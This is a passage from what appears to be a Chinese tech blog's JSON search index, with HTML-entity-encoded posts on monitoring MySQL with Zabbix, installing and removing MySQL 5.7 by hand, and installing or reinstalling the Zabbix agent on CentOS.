&#x5B58;&#x653E;&#x8DEF;&#x5F84;&#xFF1A;/etc/zabbix/scripts&#x3002;&#x5E76;&#x8D4B;&#x4E88;&#x811A;&#x672C;&#x6267;&#x884C;&#x6743;&#x9650;&#x3010;chmod +x check_mysql.sh&#x3011;&#x3002;","keywords":null,"text":"zabbix&#x81EA;&#x5E26;mysql&#x76D1;&#x63A7;&#x6A21;&#x677F;&#xFF0C;&#x53EF;&#x76D1;&#x63A7;mysql&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x3001;&#x8BF7;&#x6C42;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x548C;&#x54CD;&#x5E94;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x7B49;&#x3002; &#x76D1;&#x63A7;&#x6B65;&#x9AA4;1&#x3001;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B89;&#x88C5;zabbix agent&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;zabbix_agentd.conf&#x6587;&#x4EF6;1234567# vim /etc/zabbix/zabbix_agentd.confEnableRemoteCommands=1 &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;Server=zabbix_server_IP zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;ServerActive=zabbix_server_IP &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;Hostname=name name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;UnsafeUserParameters=1 &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key 2&#x3001;&#x7F16;&#x5199;check_mysql.sh&#x811A;&#x672C;, &#x5B58;&#x653E;&#x8DEF;&#x5F84;&#xFF1A;/etc/zabbix/scripts&#x3002;&#x5E76;&#x8D4B;&#x4E88;&#x811A;&#x672C;&#x6267;&#x884C;&#x6743;&#x9650;&#x3010;chmod +x check_mysql.sh&#x3011;&#x3002; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# &#x7528;&#x6237;&#x540D;MYSQL_USER=&apos;&apos;# &#x5BC6;&#x7801;MYSQL_PWD=&apos;&apos;# &#x4E3B;&#x673A;&#x5730;&#x5740;/IPMYSQL_HOST=&apos;&apos;# &#x7AEF;&#x53E3;MYSQL_PORT=&apos;&apos;# &#x6570;&#x636E;&#x8FDE;&#x63A5;MYSQL_CONN=&quot;/usr/bin/mysqladmin -u${MYSQL_USER} -p${MYSQL_PWD} -h${MYSQL_HOST} -P${MYSQL_PORT}&quot; # &#x53C2;&#x6570;&#x662F;&#x5426;&#x6B63;&#x786E;if [ $# -ne &quot;1&quot; ];then echo &quot;arg error!&quot; fi # &#x83B7;&#x53D6;&#x6570;&#x636E;case $1 in Uptime) result=`${MYSQL_CONN} status|cut -f2 -d&quot;:&quot;|cut -f1 -d&quot;T&quot;` echo $result ;; Com_update) result=`${MYSQL_CONN} extended-status |grep -w &quot;Com_update&quot;|cut -d&quot;|&quot; -f3` echo $result ;; Slow_queries) result=`${MYSQL_CONN} status |cut -f5 -d&quot;:&quot;|cut -f1 -d&quot;O&quot;` echo $result ;; Com_select) result=`${MYSQL_CONN} extended-status |grep -w &quot;Com_select&quot;|cut -d&quot;|&quot; -f3` echo $result ;; Com_rollback) result=`${MYSQL_CONN} extended-status |grep -w &quot;Com_rollback&quot;|cut -d&quot;|&quot; -f3` echo $result ;; Questions) result=`${MYSQL_CONN} status|cut -f4 -d&quot;:&quot;|cut -f1 -d&quot;S&quot;` echo $result ;; Com_insert) result=`${MYSQL_CONN} extended-status |grep -w &quot;Com_insert&quot;|cut -d&quot;|&quot; -f3` echo $result ;; Com_delete) result=`${MYSQL_CONN} extended-status |grep -w &quot;Com_delete&quot;|cut -d&quot;|&quot; -f3` echo $result ;; Com_commit) result=`${MYSQL_CONN} extended-status |grep -w &quot;Com_commit&quot;|cut -d&quot;|&quot; -f3` echo $result ;; Bytes_sent) result=`${MYSQL_CONN} extended-status |grep -w &quot;Bytes_sent&quot; |cut -d&quot;|&quot; -f3` echo $result ;; Bytes_received) result=`${MYSQL_CONN} extended-status |grep -w &quot;Bytes_received&quot; |cut -d&quot;|&quot; -f3` echo $result ;; Com_begin) result=`${MYSQL_CONN} extended-status |grep -w &quot;Com_begin&quot;|cut -d&quot;|&quot; -f3` echo $result ;; *) echo &quot;Usage:$0(Uptime|Com_update|Slow_queries|Com_select|Com_rollback|Questions|Com_insert|Com_delete|Com_commit|Bytes_sent|Bytes_received|Com_begin)&quot; ;; esac 3&#x3001;&#x4FEE;&#x6539;/etc/zabbix/zabbix_agentd.d&#x4E0B;&#x7684;userparameter_mysql.conf&#x6587;&#x4EF6;&#xFF0C;&#x6CA1;&#x6709;&#x5C31;&#x81EA;&#x884C;&#x521B;&#x5EFA;&#x3002;&#x6CE8;&#x91CA;&#x6389;&#x539F;&#x6709;key&#xFF0C;&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x65B0;&#x589E;&#x5982;&#x4E0B;&#x6570;&#x636E;&#xFF1A;123UserParameter=mysql.version,mysql -VUserParameter=mysql.ping,HOME=/var/lib/zabbix mysql ping | grep -c aliveUserParameter=mysql.status[*],/etc/zabbix/scripts/check_mysql.sh $1 4&#x3001;&#x91CD;&#x542F;zabbix&#x5BA2;&#x6237;&#x7AEF;1service zabbix-agent restart 5&#x3001;&#x5728;zabbix&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x548C;mysql&#x6A21;&#x677F;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x3010;&#x56FE;&#x5F62;&#x3011;-&gt;&#x3010;&#x9884;&#x89C8;&#x3011;&#xFF0C;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x76D1;&#x63A7;&#x56FE;&#x50CF;&#x3002; 6&#x3001;&#x5B89;&#x88C5;grafana-zabbix&#x63D2;&#x4EF6;&#xFF0C;&#x901A;&#x8FC7;grafana&#x76D1;&#x63A7;&#x76F8;&#x5173;&#x6570;&#x636E;&#x3002; &#x95EE;&#x9898;&#x6392;&#x67E5;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x76D1;&#x63A7;&#x6CA1;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x8BF7;&#x6392;&#x67E5;&#x5982;&#x4E0B;&#x95EE;&#x9898;&#xFF1A; abbix&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5426;&#x91CD;&#x542F; &#x811A;&#x672C;&#x662F;&#x5426;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650; &#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6709;&#x6743;&#x9650; &#x73AF;&#x5883;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x6709;&#x95EE;&#x9898; zabbix item&#x5217;&#x662F;&#x5426;&#x663E;&#x793A;&#x7EA2;&#x53C9;&#x3010;&#x9F20;&#x6807;&#x79FB;&#x81F3;&#x56FE;&#x6807;&#xFF0C;&#x6709;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x3011; &#x5177;&#x4F53;&#x9519;&#x8BEF;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;zabbix agent&#x6253;&#x5370;&#x7684;&#x65E5;&#x5FD7;&#x3002;&#x9ED8;&#x8BA4;&#x5730;&#x5740;&#x4E3A;&#xFF1A;LogFile=/var/log/zabbix/zabbix_agentd.log&#xFF0C;&#x53EF;&#x5728;zabbix_agentd.conf&#x4E2D;&#x4FEE;&#x6539;&#x3002; &#x6B64;&#x5904;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x6839;&#x636E;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x4FEE;&#x6539;&#x4E86;&#x914D;&#x7F6E;&#xFF0C;&#x5E76;&#x91CD;&#x542F;&#x4E86;zabbix&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;zabbix &#x670D;&#x52A1;&#x5668;&#x7684;item&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x5E76;&#x4E0D;&#x4F1A;&#x9A6C;&#x4E0A;&#x6D88;&#x5931;&#xFF0C;&#x76D1;&#x63A7;&#x9875;&#x9762;&#x4E5F;&#x4E0D;&#x4F1A;&#x9A6C;&#x4E0A;&#x4EA7;&#x751F;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x8981;&#x7ACB;&#x9A6C;&#x5224;&#x65AD;&#x4F60;&#x7684;&#x4FEE;&#x6539;&#x65E0;&#x6548;&#xFF0C;&#x6709;&#x6548;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x6253;&#x5370;&#x3002; &#x9519;&#x8BEF;&#x76F8;&#x5173; &#x5982;&#x679C;&#x65E5;&#x5FD7;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3010;/bin/sh^M: bad interpreter: No such file or directory&#x3011;&#xFF0C;&#x90A3;&#x662F;shell&#x811A;&#x672C;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x9519;&#x8BEF;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;vim&#x8FDB;&#x5165;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x6572;&#x547D;&#x4EE4;&#x3010;:set ff=unix&#x3011;&#xFF0C;&#x4FDD;&#x5B58;&#x9000;&#x51FA;&#x5373;&#x53EF;&#x3002; &#x5982;&#x679C;&#x65E5;&#x5FD7;&#x63D0;&#x793A;&#x8B66;&#x544A;&#x3010;mysqladmin: [Warning] Using a password on the command line interface can be insecure.&#x3011;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x989D;&#x5916;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;.my.cnf&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;check_mysql.sh&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x7B49;&#x4ECE;.my.cnf&#x8BFB;&#x53D6;&#x3002; &#x5982;&#x679C;zabbix&#x670D;&#x52A1;&#x5668;item&#x9879;&#x603B;&#x662F;&#x63D0;&#x793A;&#x3010;Not supported by Zabbix Agent&#x3011;&#xFF0C;&#x4E0D;&#x662F;&#x914D;&#x7F6E;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x7248;&#x672C;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;zabbix server&#x4E0A;&#x6267;&#x884C;zabbix_get&#x547D;&#x4EE4;&#x6765;&#x8BD5;&#x7740;&#x83B7;&#x53D6;item&#x503C;&#x3002; 12345yum list all |grep zabbix-getyum install zabbix-get.x86_64/usr/bin/zabbix_get -s 127.0.0.1 -p 10050 -k &quot;system.cpu.load[all,avg15]&quot;0.270000 &#x5176;&#x4ED6;zabbix&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#xFF0C;&#x7528;&#x6765;&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x548C;nginx&#x7B49;&#x3002;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x7F51;&#x4E0A;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x5230;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x3010;&#x7EC4;&#x6001;&#x3011;-&gt;&#x3010;&#x6A21;&#x677F;&#x3011;-&gt;&#x3010;&#x6C47;&#x5165;&#x3011;&#x5373;&#x53EF;&#x3002;&#x7531;&#x4E8E;&#x6C47;&#x5165;&#x7684;&#x6A21;&#x677F;&#x9ED8;&#x8BA4;&#x4F1A;&#x8986;&#x76D6;&#x539F;&#x6709;&#x914D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x8BB0;&#x5F97;&#x4E8B;&#x5148;&#x70B9;&#x51FB;&#x6A21;&#x677F;&#x5217;&#x8868;&#x5DE6;&#x4E0B;&#x89D2;&#x7684;&#x3010;&#x6C47;&#x51FA;&#x3011;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x6A21;&#x677F;&#x5907;&#x4EFD;&#x3002;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"},{"name":"zabbix","slug":"zabbix","permalink":"http://www.wangxin123.com/tags/zabbix/"}]},{"title":"MySQL安装及卸载","slug":"MySQL安装及卸载","date":"2016-09-27T14:22:00.000Z","updated":"2017-01-11T03:08:34.479Z","comments":true,"path":"2016/09/27/MySQL安装及卸载/","link":"","permalink":"http://www.wangxin123.com/2016/09/27/MySQL安装及卸载/","excerpt":"&#x5B89;&#x88C5;&#x6B64;&#x5B89;&#x88C5;&#x4E3A;&#x624B;&#x52A8;&#x5B89;&#x88C5;&#xFF0C;&#x975E;yum&#x5B89;&#x88C5;&#x3002;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://downloads.mysql.com/archives/community/ 1234567891011121314151617181920212223#&#x89E3;&#x538B;cd /usr/local/tar -zxvf mysql-5.7.13-linux-glibc2.5-x86_64.tar.gzmv mysql-5.7.13-linux-glibc2.5-x86_64 mysql#&#x521B;&#x5EFA;&#x5B9E;&#x4F8B;&#x76EE;&#x5F55;mkdir /data/mysql#&#x521B;&#x5EFA;&#x6570;&#x636E;&#x76EE;&#x5F55;mkdir /data/mysql/data#&#x521B;&#x5EFA;&#x65E5;&#x5FD7;&#x76EE;&#x5F55;mkdir /data/mysql/logs#&#x6DFB;&#x52A0;&#x7528;&#x6237;&#x3001;&#x7EC4;groupadd mysqluseradd -r -g mysql -s /bin/false mysql#&#x8BBE;&#x7F6E;&#x6743;&#x9650;chown -R mysql:mysql /usr/local/mysql /data/mysqlchmod 750 /usr/local/mysql /data/mysql#&#x5B89;&#x88C5;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;yum install -y libaio/usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql/data","keywords":null,"text":"&#x5B89;&#x88C5;&#x6B64;&#x5B89;&#x88C5;&#x4E3A;&#x624B;&#x52A8;&#x5B89;&#x88C5;&#xFF0C;&#x975E;yum&#x5B89;&#x88C5;&#x3002;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://downloads.mysql.com/archives/community/ 1234567891011121314151617181920212223#&#x89E3;&#x538B;cd /usr/local/tar -zxvf mysql-5.7.13-linux-glibc2.5-x86_64.tar.gzmv mysql-5.7.13-linux-glibc2.5-x86_64 mysql#&#x521B;&#x5EFA;&#x5B9E;&#x4F8B;&#x76EE;&#x5F55;mkdir /data/mysql#&#x521B;&#x5EFA;&#x6570;&#x636E;&#x76EE;&#x5F55;mkdir /data/mysql/data#&#x521B;&#x5EFA;&#x65E5;&#x5FD7;&#x76EE;&#x5F55;mkdir /data/mysql/logs#&#x6DFB;&#x52A0;&#x7528;&#x6237;&#x3001;&#x7EC4;groupadd mysqluseradd -r -g mysql -s /bin/false mysql#&#x8BBE;&#x7F6E;&#x6743;&#x9650;chown -R mysql:mysql /usr/local/mysql /data/mysqlchmod 750 /usr/local/mysql /data/mysql#&#x5B89;&#x88C5;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;yum install -y libaio/usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql/data 1234567891011121314151617181920212223242526#&#x914D;&#x7F6E;&#x6587;&#x4EF6;cp -rf /usr/local/mysql/support-files/my-default.cnf /data/mysqlmv my-default.cnf my.cnf#my.cnf&#x53C2;&#x6570;&#x914D;&#x7F6E;[mysql]socket = /data/mysql/mysql.sock[mysqld]lower_case_table_names = 1basedir = /usr/local/mysqldatadir = /data/mysql/dataport = 3306socket = /data/mysql/mysql.sock[mysqld_safe]user = mysqlport = 3306datadir = /data/mysql/datalog-error = /data/mysql/logs/mysqld.logpid-file = /data/mysql/mysql.pidsocket = /data/mysql/mysql.socksql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES 1234#&#x542F;&#x52A8;&#x670D;&#x52A1; &#x8BBE;&#x7F6E;&#x5BC6;&#x7801;/usr/local/mysql/bin/mysqld_safe --defaults-file=/data/mysql/my.cnf &amp;sleep 3/usr/local/mysql/bin/mysqladmin -u root password wx123 --socket=/data/mysql/mysql.sock 12345#&#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;vim /etc/profileexport PATH=/usr/local/mysql/bin:$PATHsource /etc/profile 1234567891011# &#x914D;&#x7F6E;&#x542F;&#x52A8;&#x811A;&#x672C;cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqlvim /etc/init.d/mysqlbasedir=/usr/local/mysqldatadir=/data/mysql/datamysqld_pid_file_path=/data/mysql/mysql.pid#$bindir/mysqld_safe --datadir=&quot;$datadir&quot; --pid-file=&quot;$mysqld_pid_file_path&quot; $other_args &gt;/dev/null 2&gt;&amp;1 &amp;$bindir/mysqld_safe --defaults-file=/data/mysql/my.cnf 1&gt;/dev/null &amp; 1234#&#x914D;&#x7F6E;&#x670D;&#x52A1;chmod +x /etc/init.d/mysqlchkconfig --add mysqlservice mysql restart 1234#&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;chkconfig mysql onchkconfig --list|grep mysql# mysql 0:off 1:off 2:off 3:on 4:on 5:on 6:off &#x5378;&#x8F7D;&#x624B;&#x52A8;&#x5220;&#x9664;123456789101112#&#x505C;&#x6389;mysql&#x670D;&#x52A1;service mysql stop#&#x5220;&#x9664;&#x5B89;&#x88C5;&#x76EE;&#x5F55;rm -rf /usr/local/mysql#&#x5220;&#x9664;&#x6570;&#x636E;&#x76EE;&#x5F55;rm -rf /data/mysql#&#x5220;&#x9664;&#x6B8B;&#x7559;&#x6587;&#x4EF6;find / -name &apos;*mysql*&apos;rm -rf XXX yum&#x5220;&#x9664;123456yum list installed | grep mysqlyum remove XXX#&#x5220;&#x9664;&#x6B8B;&#x7559;&#x6587;&#x4EF6;find / -name &apos;*mysql*&apos;rm -rf XXX &#x81EA;&#x52A8;&#x5316;&#x90E8;&#x7F72;&#x811A;&#x672C;https://github.com/Wasim37/deployment-scripts/tree/master/mysql &#x76F8;&#x5173;&#x94FE;&#x63A5;my.cnf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;https://blog.linuxeye.com/379.html","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"}]},{"title":"Not supported by Zabbix Agent & zabbix agent重装","slug":"Not supported by Zabbix Agent & zabbix agent重装","date":"2016-09-25T10:24:17.000Z","updated":"2017-01-09T13:16:11.586Z","comments":true,"path":"2016/09/25/Not supported by Zabbix Agent & zabbix agent重装/","link":"","permalink":"http://www.wangxin123.com/2016/09/25/Not supported by Zabbix Agent & zabbix agent重装/","excerpt":"zabbix&#x670D;&#x52A1;&#x5668;&#x663E;&#x793A;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x4E0D;&#x8D77;&#x6548;&#xFF0C;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3010;Not supported by Zabbix Agent&#x3011;&#xFF0C;&#x6700;&#x540E;&#x5B9A;&#x4F4D;&#x4E3A;zabbix&#x5BA2;&#x6237;&#x7AEF;&#x7248;&#x672C;&#x8FC7;&#x4F4E;&#x3002; Not supported by Zabbix Agent&#x4E24;&#x53F0;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BBE;&#x7F6E;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x53F0;&#x67D0;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x5931;&#x6548;&#xFF0C;&#x521D;&#x6B65;&#x6000;&#x7591;&#x662F;&#x7248;&#x672C;&#x4E0D;&#x4E00;&#x81F4;12345#&#x67E5;&#x770B;agent&#x7248;&#x672C;/usr/sbin/zabbix_agentd -V#&#x6216;&#x8005;&#x901A;&#x8FC7;yum&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x7684;&#x5305;yum list installed | grep zabbix-agent","keywords":null,"text":"zabbix&#x670D;&#x52A1;&#x5668;&#x663E;&#x793A;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x4E0D;&#x8D77;&#x6548;&#xFF0C;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3010;Not supported by Zabbix Agent&#x3011;&#xFF0C;&#x6700;&#x540E;&#x5B9A;&#x4F4D;&#x4E3A;zabbix&#x5BA2;&#x6237;&#x7AEF;&#x7248;&#x672C;&#x8FC7;&#x4F4E;&#x3002; Not supported by Zabbix Agent&#x4E24;&#x53F0;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BBE;&#x7F6E;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x53F0;&#x67D0;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x5931;&#x6548;&#xFF0C;&#x521D;&#x6B65;&#x6000;&#x7591;&#x662F;&#x7248;&#x672C;&#x4E0D;&#x4E00;&#x81F4;12345#&#x67E5;&#x770B;agent&#x7248;&#x672C;/usr/sbin/zabbix_agentd -V#&#x6216;&#x8005;&#x901A;&#x8FC7;yum&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x7684;&#x5305;yum list installed | grep zabbix-agent &#x7ED3;&#x679C;&#x663E;&#x793A;zabbix agent&#x7248;&#x672C;&#x5206;&#x522B;&#x4E3A;&#x3010;2.2.14&#x3011;&#x548C;&#x3010;1.8.22&#x3011;&#xFF0C;&#x4E0D;&#x8D77;&#x6548;&#x7684;&#x4E3A;1.8.22&#x3002;&#x4EE5;&#x4E0B;&#x662F;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x7684;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#xFF1A;123456#2.2.14&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x3010;&#x53C2;&#x7167;&#x5B98;&#x7F51;&#x3011;rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpmyum install zabbix-agent#1.8.22&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x3010;&#x76F8;&#x5BF9;&#x5B98;&#x7F51;&#xFF0C;&#x660E;&#x663E;&#x5C11;&#x4E86;&#x4E2A;&#x6B65;&#x9AA4;&#x3011;yum install zabbix-agent yum install zabbix-agent&#x4E3A;&#x4EC0;&#x4E48;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;&#x662F;1.8.22&#xFF1F;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x67E5;&#x770B;123yum list all | grep zabbix-agent# pcp-export-zabbix-agent.x86_64 3.10.9-6.el6 base # zabbix-agent.x86_64 1.8.22-1.el6 epel zabbix agent&#x91CD;&#x88C5;123456789101112131415# &#x5378;&#x8F7D;yum remove zabbix-agent# &#x5B89;&#x88C5;rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpmyum install zabbix-agent# &#x542F;&#x52A8;&#x53CA;&#x67E5;&#x770B;service zabbix-agent restartservice zabbix-agent status# zabbix_agentd (pid 32485) is running.../usr/sbin/zabbix_agentd -V# Zabbix Agent (daemon) v2.2.14 (revision 61184) (22 July 2016)# Compilation time: Jul 24 2016 06:52:24","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://www.wangxin123.com/tags/zabbix/"}]},{"title":"zabbix agent安装详解","slug":"zabbix agent安装详解","date":"2016-09-24T10:24:17.000Z","updated":"2016-11-18T01:17:04.156Z","comments":true,"path":"2016/09/24/zabbix agent安装详解/","link":"","permalink":"http://www.wangxin123.com/2016/09/24/zabbix agent安装详解/","excerpt":"&#x5B89;&#x88C5;Installing repository configuration packageZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5: 1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm","keywords":null,"text":"&#x5B89;&#x88C5;Installing repository configuration packageZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5: 1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm Installing Zabbix packagesExample for installing Zabbix agent only.1yum install zabbix-agent &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x67E5;&#x627E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x4E8B;&#x5148;&#x505A;&#x597D;&#x76F8;&#x5173;&#x5907;&#x4EFD;123find / -name &apos;*zabbix_agentd.conf*&apos;# /etc/zabbix/zabbix_agentd.confcp /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_agentd.conf.bak &#x4FEE;&#x6539;&#x76F8;&#x5173;&#x5177;&#x4F53;&#x9879;1234567# vim /etc/zabbix/zabbix_agentd.confEnableRemoteCommands=1 &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;Server=zabbix_server_IP zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;ServerActive=zabbix_server_IP &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;Hostname=name name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;UnsafeUserParameters=1 &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key &#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;12chkconfig zabbix-agent onchkconfig --list|grep zabbix-agent &#x542F;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;1service zabbix-agent start &#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x767B;&#x9646; http://zabbix_server_ip/zabbix, &#x70B9;&#x51FB; &#x3010;&#x7EC4;&#x6001;&#x3011;-&gt;&#x3010;&#x4E3B;&#x673A;&#x3011;-&gt;&#x3010;&#x521B;&#x5EFA;&#x4E3B;&#x673A;&#x3011; &#x914D;&#x7F6E;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3010;host name&#x3011;&#x3001;&#x7FA4;&#x7EC4;&#x3001;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;ip &#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x5E76;&#x4FDD;&#x5B58; 